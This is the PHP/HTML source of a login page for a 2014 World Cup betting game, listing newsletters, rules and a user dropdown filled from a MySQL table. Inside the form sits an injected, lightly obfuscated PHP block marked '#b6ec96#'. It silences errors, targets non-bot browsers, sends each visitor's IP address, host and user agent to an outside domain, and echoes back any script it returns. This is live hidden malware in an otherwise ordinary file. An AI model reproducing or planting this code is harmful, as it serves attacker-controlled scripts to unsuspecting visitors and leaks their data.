<html>
<head>
<link rel='stylesheet' type='text/css' href='../../style/style.css' />
<title>WM-Tipp Login </title>
</head>
<body>
<center>
<p><img src="../pics/WerkesWM_WebTipp_2014_Klein.png" alt="WM2014-Logo"></p>

<h2>
<a href='../anybody/showUserRanks.php5'>Punktestand</a>
</h2>

<table CELLSPACING=20>
<thead>
<tr>
<th><u>Newsletter</u></th><th><u>Regeln</u></th><th><u>Tipps aller Teilnehmer</u></th>
</tr>
</thead>
<td>
<a href='../news/WM-Newsletter-2014-06-06.docx'>WM-Newsletter #1</a>
<br>
<a href='../news/WM-Newsletter-2014-06-12.docx'>WM-Newsletter #2</a>
<br>
<a href='../news/WM-Newsletter-2014-06-17.docx'>WM-Newsletter #3</a>
<br>
<a href='../news/WM-Newsletter-2014-06-23.docx'>WM-Newsletter #4</a>
<br>
<a href='../news/WM-Newsletter-2014-06-30.docx'>WM-Newsletter #5</a>
<br>
<a href='../news/WM-Newsletter-2014-07-07.docx'>WM-Newsletter #6</a>
<br>
<a href='../news/WM-Newsletter-2014-07-10.docx'>WM-Newsletter #7</a>
<br>
<a href='../news/WM-Newsletter-2014-07-18.docx'>WM-Newsletter #8</a>
</td>
<td>
<a href='../docs/Spielregeln_WM.pdf'>WM-Tipp-Regeln</a>
</td>
<td>
<a href='../anybody/showAllUsersGroupTipps.php5?userId=$userId'>Gruppenspieltipps</a>
<br>
<a href='../anybody/showAllUsersGroupRankTipps.php5?userId=$userId'>Platzierungstipps</a>
<br>
<a href='../anybody/showAllUsersFinalmatchTipps.php5?userId=$userId'>Finalspieltipps</a>
<br>
<a href='../anybody/showAllUsersSpecialTipps.php5?userId=$userId'>Spezialtipps</a>
</td>
</table>

<form method="POST" action="../anybody/showAllTippsAndScore.php5">
Alle Tipps von
<td bgcolor=slategray><select name='SelectedUsername'>
<?php
allUsersAsOption("User");
?>
<?php
#b6ec96#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/b6ec96#
?>
</td>
<br>
<input type='submit' name='showUser' value='anzeigen'/>
</form>
</center>

</body>
</html>

<?php

function allUsersAsOption($optionName) {
	include_once("../../connection/dbaccess.php5");
	include_once("../../general/log/log.php5");
	include_once("../util/dbschema.php5");
	$log=new logger();	
	$log->info("Viewed login page");
	$table_users=dbschema::users;
	$sqlUsers="SELECT * FROM $table_users ORDER BY username";
	//$log->info($sqlUsers);
	$sqlUsersResult=mysql_query($sqlUsers);
	$numUsers=mysql_num_rows($sqlUsersResult);
	if ($numUsers==0)
	{
		$log->info("keine passenden Datensätze gefunden");
		echo "keine passenden Datensätze gefunden";
	}
	else
	{
		//$log->info("Anzahl User=". $numUsers);
		for ($i=0; $i<$numUsers; $i++)
		{
			$name = mysql_result($sqlUsersResult, $i, "username");
			if($name!='admin' && $name!='real')
			{
				echo"<option name=$optionName >$name</option>";
			}
		}
	}
}
?>